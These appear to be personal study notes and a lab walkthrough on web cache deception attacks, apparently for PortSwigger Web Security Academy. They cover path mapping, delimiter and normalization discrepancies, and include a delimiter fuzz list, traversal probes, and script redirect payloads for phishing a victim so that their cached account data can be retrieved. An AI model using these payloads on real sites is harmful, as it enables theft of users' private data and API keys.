# Web Cache  

>Cache rules determine what can be cached and for how long.  

>Web cache deception attacks exploit how cache rules are applied.  

* Static file extension rules  
* Static directory rules - path mappings  
* File name rules  

>Web Cache Exploitation:  

1. Craft a malicious URL that uses the discrepancy to trick the cache into storing a dynamic response.  
2. When the victim accesses the URL, their response is stored in the cache.  
3. Using Burp, you can then send a request to the same URL to fetch the cached response containing the victim's data.  

## Path Mapping  

>identify path mapping vulnerability:  
>Add a static extension to the URL path:  

```
/my-account/abc.js
```  

>resending and `X-Cache` header changes to `hit`  

>Payload for Exploiting path mapping for web cache deception:  

```javascript
<script>document.location="https://target.web.net/my-account/wcd.js"</script>
```  

## Delimiter Cache Discrepancies  

>Identify delimiter cache vulnerability:  

```
/profile%00foo.js
/settings/users/list;aaa.js
```  

>Encoded null `%00` character as a delimiter.  
>Origin server uses `;` as a delimiter.  

>Exploiting path delimiters for web cache deception payload:  

```javascript
<script>document.location="https://target.web.net/my-account;wcd.js"</script>
```  

## Delimiter Decoding Discrepancies  

>If a delimiter character is decoded, it may then be treated as a delimiter, truncating the URL path.  

>Identify vulnerability:  

```
/profile%23wcd.css
```  

>The origin server decodes `%23`, Uses the URL-encoded `#` character  
>`%3f` decoded as `?`  

## Normalization Static Directory  

>`/static`, `/assets`, `/scripts`, or `/images` ulnerable to web cache deception.  

>Identify normalization by cache server:  

>Add a path traversal sequence after the directory prefix. `/assets/js/stockCheck.js` to `/assets/..%2fjs/stockCheck.js`  

### Identify  

>Identify a target endpoint by Change the path to `/my-accountabc`,   
>then send the request. Notice that this returns a `404 Not Found`  

>Using intruder, to identify characters that may be used as delimiters.  
>Deselect URL-encode these characters.

```
~
!
%21
@
%40
#
%23
$
%24
%
^
&
*
(
)
_
+
%2B
|
}
{
"
:
?
%3f
>
%3E
<
%3C
,
.
/
%2f
'
;
%3b
]
[
\
=
-
`
%00
 
%21
%22
%23
%24
%25
%26
%27
%28
%29
%2A
%2B
%2C
%2D
%2E
%2F
%3A
%3B
%3C
%3D
%3E
%3F
%40
%5B
%5C
%5D
%5E
%5F
%60
%7B
%7C
%7D
%7E
```

![portswigger_web_cache_characters_delimiters.png](/images/portswigger_web_cache_characters_delimiters.png)  

>Identified the `?` character receives a 200 response with your API key.  
>Indicate that the origin server only uses `?` as a path delimiter.  
>As ? is generally universally used as a path delimiter, move on to more enumeration and investigate normalization discrepancies.  

### Enumeration  

>Investigate normalization discrepancies  
>Test Payload `/aaa/..%2fmy-account`  
>Receives a 200 response with your API key.  
>This indicates that the origin server decodes and resolves the dot-segment,  
>interpreting the URL path as `/my-account`.  

>Enumerating directory prefix `/resources`  

>Test Payload for directory prefix `/resources/..%2fEXPLOITtracking.js`  
>Resending a second time the response result in response contianing cache headers:  

```
Cache-Control: max-age=30
Age: 4
X-Cache: hit
```  

>Vulnerability Identified:
>Cache headers confirms that there is a static directory cache rule based on the `/resources` prefix.  

### Exploit  

>Exploiting origin server normalization for web cache deception  

>On exploit server.  
>Update Body section, craft an exploit that navigates the victim user carlos to a malicious URL.  
>Make sure to add an ***random*** parameter as a cache buster, so the victim doesn't receive your previously cached response:  

```javascript
<script>document.location="https://0a5600720421b10280036c920090001a.web-security-academy.net/resources/..%2fmy-account?nut"</script>
```  

![portswigger_web_cache_exploit_server_directory_cache_rule.png](/images/portswigger_web_cache_exploit_server_directory_cache_rule.png)  

>Deliver exploit phishing to victim.  

>Go to the URL that you delivered in phishing to `carlos` in your exploitto retrieved the poisoned web cache:  

```
https://0a5600720421b10280036c920090001a.web-security-academy.net/resources/..%2fmy-account?nut
```  

>data Exfiltrated browsing to poisoned web cache url above  

## Exploit Normalization Cache Server  

>Test origin server payload: `/<dynamic-path>%2f%2e%2e%2f<static-directory-prefix>`  
>Resolve to `/<dynamic-path>/../<static-directory-prefix>`  

### Identify a target endpoint  

>Identify a target endpoint by Change the path to `/my-accountabc`,   
>Using intruder, to identify characters that may be used as ***delimiters***.  
>Deselect ***URL-encode these characters***.  

![portswigger_web_cache_origin_server_path_delimiters.png](/images/portswigger_web_cache_origin_server_path_delimiters.png)  

>Identified ? as origin server valid path delimiter.  

### Enumerating  

>Repeat previous intruder attack test using the `%23`, `%3f` and `?` characters.  
>Notice that the responses don't show evidence of caching headers.  

>Finding normalization discrepancies.  
>Testing payloads for directory prefix.

```
/aaa/..%2fresources/YOUR-RESOURCE
/aaa/..%2fresources/EXPLOIT.js
```  

>Indicate that the cache decodes and resolves the dot-segment and has a cache rule based.  
>Test without leading random directory, `/resources/..%2fYOUR-RESOURCE` and notice 404 response.  
>Idnetified that the cache decodes and resolves the dot-segment and has a cache rule based on the `/resources` prefix.  

### Exploiting  

>Exploiting cache server normalization for web cache deception  

>Craft POC to validate vulnerability:  

```
/my-account%23%2f%2e%2e%2fresources
```  

>Decode as `/my-account#/../resources` and rersulting in tricking the cache rule looking for `/resources` and the `#` terminating the URL.  

>Phishing payload delivered to victim Carlos via Exploit server Body:  
>Add an random arbitrary parameter as a cache buster `nuts`:  

```javascript
<script>document.location="https://0a2d00e80389c11c803103ba0042002a.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?nuts"</script>
```  

![portswigger_web_cache_exploit_server_delimiter_with_directory_cache_rule.png](/images/portswigger_web_cache_exploit_server_delimiter_with_directory_cache_rule.png)  

>Go retrieve sensitvie data exfiltrated via poisoned web cache.  
>Including the random arbitrary parameter used before as the cache buster `nuts`:  

```
https://target.web.net/my-account%23%2f%2e%2e%2fresources?nuts
```  

## File Name Cache Rule   

>Cache rules target these files by matching the exact file name string.  

```
robots.txt
index.html
favicon.ico
```  

----  
